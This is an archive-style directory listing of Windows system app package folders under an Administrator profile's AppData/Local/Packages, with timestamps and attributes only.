2025-02-16 11:11:01 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.Apprep.ChxApp_cw5n1h2txyewy/Settings
2025-02-16 11:11:01 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.Apprep.ChxApp_cw5n1h2txyewy/SystemAppData
2025-02-16 11:11:01 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.Apprep.ChxApp_cw5n1h2txyewy/TempState
2025-02-16 11:11:01 D.HS.                            Administrator/AppData/Local/Packages/Microsoft.Windows.Apprep.ChxApp_cw5n1h2txyewy/AC/INetCache
2025-02-16 11:11:01 D.HS.                            Administrator/AppData/Local/Packages/Microsoft.Windows.Apprep.ChxApp_cw5n1h2txyewy/AC/INetCookies
2025-02-16 11:11:01 D.HS.                            Administrator/AppData/Local/Packages/Microsoft.Windows.Apprep.ChxApp_cw5n1h2txyewy/AC/INetHistory
2025-02-16 11:11:01 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.Apprep.ChxApp_cw5n1h2txyewy/AC/Temp
2025-02-16 11:11:01 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.CapturePicker_cw5n1h2txyewy/AC
2025-02-16 11:11:01 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.CapturePicker_cw5n1h2txyewy/AppData
2025-02-16 11:11:01 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.CapturePicker_cw5n1h2txyewy/LocalCache
2025-02-16 11:11:01 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.CapturePicker_cw5n1h2txyewy/LocalState
2025-02-16 11:11:01 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.CapturePicker_cw5n1h2txyewy/RoamingState
2025-02-16 11:11:01 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.CapturePicker_cw5n1h2txyewy/Settings
2025-02-16 11:11:01 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.CapturePicker_cw5n1h2txyewy/SystemAppData
2025-02-16 11:11:01 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.CapturePicker_cw5n1h2txyewy/TempState
2025-02-16 11:11:01 D.HS.                            Administrator/AppData/Local/Packages/Microsoft.Windows.CapturePicker_cw5n1h2txyewy/AC/INetCache
2025-02-16 11:11:01 D.HS.                            Administrator/AppData/Local/Packages/Microsoft.Windows.CapturePicker_cw5n1h2txyewy/AC/INetCookies
2025-02-16 11:11:01 D.HS.                            Administrator/AppData/Local/Packages/Microsoft.Windows.CapturePicker_cw5n1h2txyewy/AC/INetHistory
2025-02-16 11:11:01 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.CapturePicker_cw5n1h2txyewy/AC/Temp
2025-02-16 10:48:48 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.CloudExperienceHost_cw5n1h2txyewy/AC
2025-02-16 10:48:48 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.CloudExperienceHost_cw5n1h2txyewy/AppData
2025-02-16 10:48:48 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.CloudExperienceHost_cw5n1h2txyewy/LocalCache
2025-02-16 10:48:48 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.CloudExperienceHost_cw5n1h2txyewy/LocalState
2025-02-16 10:48:48 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.CloudExperienceHost_cw5n1h2txyewy/RoamingState
2025-02-16 10:48:48 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.CloudExperienceHost_cw5n1h2txyewy/Settings
2025-02-16 10:48:48 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.CloudExperienceHost_cw5n1h2txyewy/SystemAppData
2025-02-16 10:48:48 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.CloudExperienceHost_cw5n1h2txyewy/TempState
2025-02-16 10:48:48 D.HS.                            Administrator/AppData/Local/Packages/Microsoft.Windows.CloudExperienceHost_cw5n1h2txyewy/AC/INetCache
2025-02-16 10:48:48 D.HS.                            Administrator/AppData/Local/Packages/Microsoft.Windows.CloudExperienceHost_cw5n1h2txyewy/AC/INetCookies
2025-02-16 10:48:48 D.HS.                            Administrator/AppData/Local/Packages/Microsoft.Windows.CloudExperienceHost_cw5n1h2txyewy/AC/INetHistory
2025-02-16 10:48:48 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.CloudExperienceHost_cw5n1h2txyewy/AC/Temp
2025-02-16 11:11:01 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.NarratorQuickStart_8wekyb3d8bbwe/AC
2025-02-16 11:11:01 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.NarratorQuickStart_8wekyb3d8bbwe/AppData
2025-02-16 11:11:01 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.NarratorQuickStart_8wekyb3d8bbwe/LocalCache
2025-02-16 11:11:01 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.NarratorQuickStart_8wekyb3d8bbwe/LocalState
2025-02-16 11:11:01 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.NarratorQuickStart_8wekyb3d8bbwe/RoamingState
2025-02-16 11:11:01 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.NarratorQuickStart_8wekyb3d8bbwe/Settings
2025-02-16 11:11:01 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.NarratorQuickStart_8wekyb3d8bbwe/SystemAppData
2025-02-16 11:11:01 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.NarratorQuickStart_8wekyb3d8bbwe/TempState
2025-02-16 11:11:01 D.HS.                            Administrator/AppData/Local/Packages/Microsoft.Windows.NarratorQuickStart_8wekyb3d8bbwe/AC/INetCache
2025-02-16 11:11:01 D.HS.                            Administrator/AppData/Local/Packages/Microsoft.Windows.NarratorQuickStart_8wekyb3d8bbwe/AC/INetCookies
2025-02-16 11:11:01 D.HS.                            Administrator/AppData/Local/Packages/Microsoft.Windows.NarratorQuickStart_8wekyb3d8bbwe/AC/INetHistory
2025-02-16 11:11:01 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.NarratorQuickStart_8wekyb3d8bbwe/AC/Temp
2025-02-16 10:48:48 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.OOBENetworkCaptivePortal_cw5n1h2txyewy/AC
2025-02-16 10:48:48 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.OOBENetworkCaptivePortal_cw5n1h2txyewy/AppData
2025-02-16 10:48:48 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.OOBENetworkCaptivePortal_cw5n1h2txyewy/LocalCache
2025-02-16 10:48:48 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.OOBENetworkCaptivePortal_cw5n1h2txyewy/LocalState
2025-02-16 10:48:48 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.OOBENetworkCaptivePortal_cw5n1h2txyewy/RoamingState
2025-02-16 10:48:48 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.OOBENetworkCaptivePortal_cw5n1h2txyewy/Settings
2025-02-16 10:48:48 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.OOBENetworkCaptivePortal_cw5n1h2txyewy/SystemAppData
2025-02-16 10:48:48 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.OOBENetworkCaptivePortal_cw5n1h2txyewy/TempState
2025-02-16 10:48:48 D.HS.                            Administrator/AppData/Local/Packages/Microsoft.Windows.OOBENetworkCaptivePortal_cw5n1h2txyewy/AC/INetCache
2025-02-16 10:48:48 D.HS.                            Administrator/AppData/Local/Packages/Microsoft.Windows.OOBENetworkCaptivePortal_cw5n1h2txyewy/AC/INetCookies
2025-02-16 10:48:48 D.HS.                            Administrator/AppData/Local/Packages/Microsoft.Windows.OOBENetworkCaptivePortal_cw5n1h2txyewy/AC/INetHistory
2025-02-16 10:48:48 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.OOBENetworkCaptivePortal_cw5n1h2txyewy/AC/Temp
2025-02-16 10:48:48 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.OOBENetworkConnectionFlow_cw5n1h2txyewy/AC
2025-02-16 10:48:48 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.OOBENetworkConnectionFlow_cw5n1h2txyewy/AppData
2025-02-16 10:48:48 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.OOBENetworkConnectionFlow_cw5n1h2txyewy/LocalCache
2025-02-16 10:48:48 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.OOBENetworkConnectionFlow_cw5n1h2txyewy/LocalState
2025-02-16 10:48:48 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.OOBENetworkConnectionFlow_cw5n1h2txyewy/RoamingState
2025-02-16 10:48:48 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.OOBENetworkConnectionFlow_cw5n1h2txyewy/Settings
2025-02-16 10:48:48 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.OOBENetworkConnectionFlow_cw5n1h2txyewy/SystemAppData
2025-02-16 10:48:48 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.OOBENetworkConnectionFlow_cw5n1h2txyewy/TempState
2025-02-16 10:48:48 D.HS.                            Administrator/AppData/Local/Packages/Microsoft.Windows.OOBENetworkConnectionFlow_cw5n1h2txyewy/AC/INetCache
2025-02-16 10:48:48 D.HS.                            Administrator/AppData/Local/Packages/Microsoft.Windows.OOBENetworkConnectionFlow_cw5n1h2txyewy/AC/INetCookies
2025-02-16 10:48:48 D.HS.                            Administrator/AppData/Local/Packages/Microsoft.Windows.OOBENetworkConnectionFlow_cw5n1h2txyewy/AC/INetHistory
2025-02-16 10:48:48 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.OOBENetworkConnectionFlow_cw5n1h2txyewy/AC/Temp
2025-02-16 11:11:01 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.PeopleExperienceHost_cw5n1h2txyewy/AC
2025-02-16 11:11:01 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.PeopleExperienceHost_cw5n1h2txyewy/AppData
2025-02-16 11:11:01 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.PeopleExperienceHost_cw5n1h2txyewy/LocalCache
2025-02-16 11:11:01 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.PeopleExperienceHost_cw5n1h2txyewy/LocalState
2025-02-16 11:11:01 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.PeopleExperienceHost_cw5n1h2txyewy/RoamingState
2025-02-16 11:11:01 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.PeopleExperienceHost_cw5n1h2txyewy/Settings
2025-02-16 11:11:01 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.PeopleExperienceHost_cw5n1h2txyewy/SystemAppData
2025-02-16 11:11:01 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.PeopleExperienceHost_cw5n1h2txyewy/TempState
2025-02-16 11:11:01 D.HS.                            Administrator/AppData/Local/Packages/Microsoft.Windows.PeopleExperienceHost_cw5n1h2txyewy/AC/INetCache
2025-02-16 11:11:01 D.HS.                            Administrator/AppData/Local/Packages/Microsoft.Windows.PeopleExperienceHost_cw5n1h2txyewy/AC/INetCookies
2025-02-16 11:11:01 D.HS.                            Administrator/AppData/Local/Packages/Microsoft.Windows.PeopleExperienceHost_cw5n1h2txyewy/AC/INetHistory
2025-02-16 11:11:01 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.PeopleExperienceHost_cw5n1h2txyewy/AC/Temp
2025-02-16 11:11:01 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.PinningConfirmationDialog_cw5n1h2txyewy/AC
2025-02-16 11:11:01 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.PinningConfirmationDialog_cw5n1h2txyewy/AppData
2025-02-16 11:11:01 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.PinningConfirmationDialog_cw5n1h2txyewy/LocalCache
2025-02-16 11:11:01 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.PinningConfirmationDialog_cw5n1h2txyewy/LocalState
2025-02-16 11:11:01 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.PinningConfirmationDialog_cw5n1h2txyewy/RoamingState
2025-02-16 11:11:01 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.PinningConfirmationDialog_cw5n1h2txyewy/Settings
2025-02-16 11:11:01 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.PinningConfirmationDialog_cw5n1h2txyewy/SystemAppData
2025-02-16 11:11:01 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.PinningConfirmationDialog_cw5n1h2txyewy/TempState
2025-02-16 11:11:01 D.HS.                            Administrator/AppData/Local/Packages/Microsoft.Windows.PinningConfirmationDialog_cw5n1h2txyewy/AC/INetCache
2025-02-16 11:11:01 D.HS.                            Administrator/AppData/Local/Packages/Microsoft.Windows.PinningConfirmationDialog_cw5n1h2txyewy/AC/INetCookies
2025-02-16 11:11:01 D.HS.                            Administrator/AppData/Local/Packages/Microsoft.Windows.PinningConfirmationDialog_cw5n1h2txyewy/AC/INetHistory
2025-02-16 11:11:01 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.PinningConfirmationDialog_cw5n1h2txyewy/AC/Temp
2025-02-16 10:52:22 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/AC
2025-02-16 10:52:22 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/AppData
2025-02-16 10:48:50 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalCache
2025-02-16 10:52:23 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState
2025-02-16 10:48:50 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/RoamingState
2025-02-16 10:48:52 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/Settings
2025-02-16 10:48:50 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/SystemAppData
2025-02-16 11:12:53 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/TempState
2025-02-16 10:59:22 D.HS.                            Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/AC/INetCache
2025-02-16 10:52:22 D.HS.                            Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/AC/INetCookies
2025-02-16 10:48:50 D.HS.                            Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/AC/INetHistory
2025-02-16 10:52:22 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/AC/Microsoft
2025-02-16 10:52:22 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/AC/Temp
2025-02-16 10:48:53 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/AC/TokenBroker
2025-02-16 10:52:22 D.HS.                            Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/AC/INetCookies/ESE
2025-02-16 10:52:22 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/AC/Microsoft/Internet Explorer
2025-02-16 10:52:22 D.HS.                            Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/AC/Microsoft/Internet Explorer/DOMStore
2025-02-16 10:52:22 D.HS.                            Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/AC/Microsoft/Internet Explorer/DOMStore/AKRB79I3
2025-02-16 10:52:22 D.HS.                            Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/AC/Microsoft/Internet Explorer/DOMStore/M9FQX7WM
2025-02-16 10:52:22 D.HS.                            Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/AC/Microsoft/Internet Explorer/DOMStore/OE6AMWVI
2025-02-16 10:52:22 D.HS.                            Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/AC/Microsoft/Internet Explorer/DOMStore/X4PLXDN9
2025-02-16 10:48:53 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/AC/TokenBroker/Cache
2025-02-16 10:52:22 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/AppData/CacheStorage
2025-02-16 10:54:27 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/AppData/Indexed DB
2025-02-16 10:59:28 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache
2025-02-16 11:11:30 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/ConstraintIndex
2025-02-16 11:11:30 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/DeviceSearchCache
2025-02-16 10:52:23 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/Flighting
2025-02-16 11:10:47 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125
2025-02-16 11:11:01 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/ConstraintIndex/Apps_{6eca1642-b3d7-4be3-80a7-3ed2d8020eaf}
2025-02-16 11:10:47 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/ConstraintIndex/Apps_{ce0f41bc-1e91-49e0-b03c-1d884f810842}
2025-02-16 11:11:30 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/ConstraintIndex/Apps_{effa8414-bc5e-4b37-9bb2-488e334cafda}
2025-02-16 10:57:56 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/ConstraintIndex/Apps_{ff6f46fd-3c24-4369-b7e0-93c115343bc2}
2025-02-16 10:48:53 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/ConstraintIndex/Input_{e6203cc7-00e9-4c54-bb59-fd11614004f4}
2025-02-16 11:11:29 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/ConstraintIndex/Settings_{4b54d621-d387-4d8f-aab0-2a598448f98b}
2025-02-16 10:52:23 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/ConstraintIndex/Settings_{ca29f10f-66ec-4f93-874a-42f0228a3350}
2025-02-16 11:11:01 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.SecHealthUI_cw5n1h2txyewy/AC
2025-02-16 11:11:01 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.SecHealthUI_cw5n1h2txyewy/AppData
2025-02-16 11:11:01 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.SecHealthUI_cw5n1h2txyewy/LocalCache
2025-02-16 11:11:01 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.SecHealthUI_cw5n1h2txyewy/LocalState
2025-02-16 11:11:01 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.SecHealthUI_cw5n1h2txyewy/RoamingState
2025-02-16 11:11:01 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.SecHealthUI_cw5n1h2txyewy/Settings
2025-02-16 11:11:01 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.SecHealthUI_cw5n1h2txyewy/SystemAppData
2025-02-16 11:11:01 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.SecHealthUI_cw5n1h2txyewy/TempState
2025-02-16 11:11:01 D.HS.                            Administrator/AppData/Local/Packages/Microsoft.Windows.SecHealthUI_cw5n1h2txyewy/AC/INetCache
2025-02-16 11:11:01 D.HS.                            Administrator/AppData/Local/Packages/Microsoft.Windows.SecHealthUI_cw5n1h2txyewy/AC/INetCookies
2025-02-16 11:11:01 D.HS.                            Administrator/AppData/Local/Packages/Microsoft.Windows.SecHealthUI_cw5n1h2txyewy/AC/INetHistory
2025-02-16 11:11:01 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.SecHealthUI_cw5n1h2txyewy/AC/Temp
2025-02-16 10:48:49 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.ShellExperienceHost_cw5n1h2txyewy/AC
2025-02-16 10:48:49 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.ShellExperienceHost_cw5n1h2txyewy/AppData
2025-02-16 10:48:49 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.ShellExperienceHost_cw5n1h2txyewy/LocalCache
2025-02-16 10:48:49 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.ShellExperienceHost_cw5n1h2txyewy/LocalState
2025-02-16 10:48:49 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.ShellExperienceHost_cw5n1h2txyewy/RoamingState
2025-02-16 10:48:49 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.ShellExperienceHost_cw5n1h2txyewy/Settings
2025-02-16 10:48:49 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.ShellExperienceHost_cw5n1h2txyewy/SystemAppData
2025-02-16 10:48:49 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.ShellExperienceHost_cw5n1h2txyewy/TempState
2025-02-16 10:48:49 D.HS.                            Administrator/AppData/Local/Packages/Microsoft.Windows.ShellExperienceHost_cw5n1h2txyewy/AC/INetCache
2025-02-16 10:48:49 D.HS.                            Administrator/AppData/Local/Packages/Microsoft.Windows.ShellExperienceHost_cw5n1h2txyewy/AC/INetCookies
2025-02-16 10:48:49 D.HS.                            Administrator/AppData/Local/Packages/Microsoft.Windows.ShellExperienceHost_cw5n1h2txyewy/AC/INetHistory
2025-02-16 10:48:49 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.ShellExperienceHost_cw5n1h2txyewy/AC/Temp
2025-02-16 10:48:49 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy/AC
2025-02-16 10:48:49 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy/AppData
2025-02-16 10:48:49 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy/LocalCache
2025-02-16 10:48:49 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy/LocalState
2025-02-16 10:48:49 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy/RoamingState
2025-02-16 10:48:52 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy/Settings
2025-02-16 10:48:49 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy/SystemAppData
2025-02-16 11:11:03 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy/TempState
2025-02-16 10:48:49 D.HS.                            Administrator/AppData/Local/Packages/Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy/AC/INetCache
2025-02-16 10:48:49 D.HS.                            Administrator/AppData/Local/Packages/Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy/AC/INetCookies
2025-02-16 10:48:49 D.HS.                            Administrator/AppData/Local/Packages/Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy/AC/INetHistory
2025-02-16 10:48:49 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy/AC/Temp
2025-02-16 11:11:00 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.XGpuEjectDialog_cw5n1h2txyewy/AC
2025-02-16 11:11:00 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.XGpuEjectDialog_cw5n1h2txyewy/AppData
2025-02-16 11:11:00 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.XGpuEjectDialog_cw5n1h2txyewy/LocalCache
2025-02-16 11:11:00 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.XGpuEjectDialog_cw5n1h2txyewy/LocalState
2025-02-16 11:11:00 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.XGpuEjectDialog_cw5n1h2txyewy/RoamingState
2025-02-16 11:11:00 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.XGpuEjectDialog_cw5n1h2txyewy/Settings
2025-02-16 11:11:00 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.XGpuEjectDialog_cw5n1h2txyewy/SystemAppData
2025-02-16 11:11:00 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.XGpuEjectDialog_cw5n1h2txyewy/TempState
2025-02-16 11:11:00 D.HS.                            Administrator/AppData/Local/Packages/Microsoft.Windows.XGpuEjectDialog_cw5n1h2txyewy/AC/INetCache
2025-02-16 11:11:00 D.HS.                            Administrator/AppData/Local/Packages/Microsoft.Windows.XGpuEjectDialog_cw5n1h2txyewy/AC/INetCookies
2025-02-16 11:11:00 D.HS.                            Administrator/AppData/Local/Packages/Microsoft.Windows.XGpuEjectDialog_cw5n1h2txyewy/AC/INetHistory
2025-02-16 11:11:00 D....                            Administrator/AppData/Local/Packages/Microsoft.Windows.XGpuEjectDialog_cw5n1h2txyewy/AC/Temp
2025-02-16 10:48:49 D....                            Administrator/AppData/Local/Packages/MicrosoftWindows.Client.CBS_cw5n1h2txyewy/AC
2025-02-16 10:48:49 D....                            Administrator/AppData/Local/Packages/MicrosoftWindows.Client.CBS_cw5n1h2txyewy/AppData
2025-02-16 10:48:49 D....                            Administrator/AppData/Local/Packages/MicrosoftWindows.Client.CBS_cw5n1h2txyewy/LocalCache
2025-02-16 10:48:49 D....                            Administrator/AppData/Local/Packages/MicrosoftWindows.Client.CBS_cw5n1h2txyewy/LocalState
2025-02-16 10:48:49 D....                            Administrator/AppData/Local/Packages/MicrosoftWindows.Client.CBS_cw5n1h2txyewy/RoamingState
2025-02-16 10:48:49 D....                            Administrator/AppData/Local/Packages/MicrosoftWindows.Client.CBS_cw5n1h2txyewy/Settings
2025-02-16 10:48:49 D....                            Administrator/AppData/Local/Packages/MicrosoftWindows.Client.CBS_cw5n1h2txyewy/SystemAppData
2025-02-16 10:48:49 D....                            Administrator/AppData/Local/Packages/MicrosoftWindows.Client.CBS_cw5n1h2txyewy/TempState
2025-02-16 10:48:49 D.HS.                            Administrator/AppData/Local/Packages/MicrosoftWindows.Client.CBS_cw5n1h2txyewy/AC/INetCache
2025-02-16 10:48:49 D.HS.                            Administrator/AppData/Local/Packages/MicrosoftWindows.Client.CBS_cw5n1h2txyewy/AC/INetCookies
2025-02-16 10:48:49 D.HS.                            Administrator/AppData/Local/Packages/MicrosoftWindows.Client.CBS_cw5n1h2txyewy/AC/INetHistory
2025-02-16 10:48:49 D....                            Administrator/AppData/Local/Packages/MicrosoftWindows.Client.CBS_cw5n1h2txyewy/AC/Temp
2025-02-16 11:11:00 D....                            Administrator/AppData/Local/Packages/MicrosoftWindows.UndockedDevKit_cw5n1h2txyewy/AC
2025-02-16 11:11:00 D....                            Administrator/AppData/Local/Packages/MicrosoftWindows.UndockedDevKit_cw5n1h2txyewy/AppData
2025-02-16 11:11:00 D....                            Administrator/AppData/Local/Packages/MicrosoftWindows.UndockedDevKit_cw5n1h2txyewy/LocalCache
2025-02-16 11:11:00 D....                            Administrator/AppData/Local/Packages/MicrosoftWindows.UndockedDevKit_cw5n1h2txyewy/LocalState
2025-02-16 11:11:00 D....                            Administrator/AppData/Local/Packages/MicrosoftWindows.UndockedDevKit_cw5n1h2txyewy/RoamingState
2025-02-16 11:11:00 D....                            Administrator/AppData/Local/Packages/MicrosoftWindows.UndockedDevKit_cw5n1h2txyewy/Settings
2025-02-16 11:11:00 D....                            Administrator/AppData/Local/Packages/MicrosoftWindows.UndockedDevKit_cw5n1h2txyewy/SystemAppData
2025-02-16 11:11:00 D....                            Administrator/AppData/Local/Packages/MicrosoftWindows.UndockedDevKit_cw5n1h2txyewy/TempState
2025-02-16 11:11:00 D.HS.                            Administrator/AppData/Local/Packages/MicrosoftWindows.UndockedDevKit_cw5n1h2txyewy/AC/INetCache
2025-02-16 11:11:00 D.HS.                            Administrator/AppData/Local/Packages/MicrosoftWindows.UndockedDevKit_cw5n1h2txyewy/AC/INetCookies
2025-02-16 11:11:00 D.HS.                            Administrator/AppData/Local/Packages/MicrosoftWindows.UndockedDevKit_cw5n1h2txyewy/AC/INetHistory
2025-02-16 11:11:00 D....                            Administrator/AppData/Local/Packages/MicrosoftWindows.UndockedDevKit_cw5n1h2txyewy/AC/Temp
2025-02-16 11:11:00 D....                            Administrator/AppData/Local/Packages/Windows.CBSPreview_cw5n1h2txyewy/AC
2025-02-16 11:11:00 D....                            Administrator/AppData/Local/Packages/Windows.CBSPreview_cw5n1h2txyewy/AppData
2025-02-16 11:11:00 D....                            Administrator/AppData/Local/Packages/Windows.CBSPreview_cw5n1h2txyewy/LocalCache
2025-02-16 11:11:00 D....                            Administrator/AppData/Local/Packages/Windows.CBSPreview_cw5n1h2txyewy/LocalState
2025-02-16 11:11:00 D....                            Administrator/AppData/Local/Packages/Windows.CBSPreview_cw5n1h2txyewy/RoamingState
2025-02-16 11:11:00 D....                            Administrator/AppData/Local/Packages/Windows.CBSPreview_cw5n1h2txyewy/Settings
